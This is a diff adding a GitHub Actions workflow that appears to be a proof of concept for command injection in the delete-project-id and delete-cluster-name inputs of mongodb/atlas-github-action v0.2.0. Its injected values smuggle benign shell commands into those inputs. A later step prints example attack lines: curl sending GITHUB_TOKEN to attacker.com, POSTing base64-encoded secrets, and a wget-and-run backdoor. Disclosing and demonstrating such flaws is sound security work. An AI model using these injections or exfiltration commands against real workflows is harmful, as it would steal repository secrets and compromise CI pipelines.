@@ -1,0 +1,48 @@
+name: POC - Comprehensive Command Injection Demonstration
+
+on:
+  workflow_dispatch:
+  push:
+    branches:
+      - main
+
+jobs:
+  comprehensive-poc:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Demonstrate Multiple Injection Vectors
+        uses: mongodb/atlas-github-action@v0.2.0
+        with:
+          # Multiple injection points demonstrated
+          delete-project-id: "fake-id; echo '=== INJECTION 1: delete-project-id ===' && date && echo 'Runner OS:' && uname -a #"
+          delete-cluster-name: "fake-cluster; echo '=== INJECTION 2: delete-cluster-name ===' && echo 'Current user:' && whoami #"
+
+      - name: Show What Attacker Could Access
+        shell: bash
+        run: |
+          echo "=========================================="
+          echo "VULNERABILITY CONFIRMED - Multiple Vectors"
+          echo "=========================================="
+          echo ""
+          echo "An attacker could inject commands that:"
+          echo ""
+          echo "1. Exfiltrate Secrets:"
+          echo "   curl https://attacker.com/steal?token=\$GITHUB_TOKEN"
+          echo ""
+          echo "2. Access Repository Secrets:"
+          echo "   echo \${{ secrets.SOME_SECRET }} | base64 | curl -X POST https://attacker.com"
+          echo ""
+          echo "3. Modify Artifacts:"
+          echo "   echo 'malicious code' > artifact.txt"
+          echo ""
+          echo "4. Access Other Repositories:"
+          echo "   gh repo list --limit 100"
+          echo ""
+          echo "5. Install Backdoors:"
+          echo "   wget https://attacker.com/backdoor.sh -O /tmp/bd.sh && bash /tmp/bd.sh"
+          echo ""
+          echo "All of these would execute with the permissions of the GITHUB_TOKEN"
+          echo "associated with the workflow run."
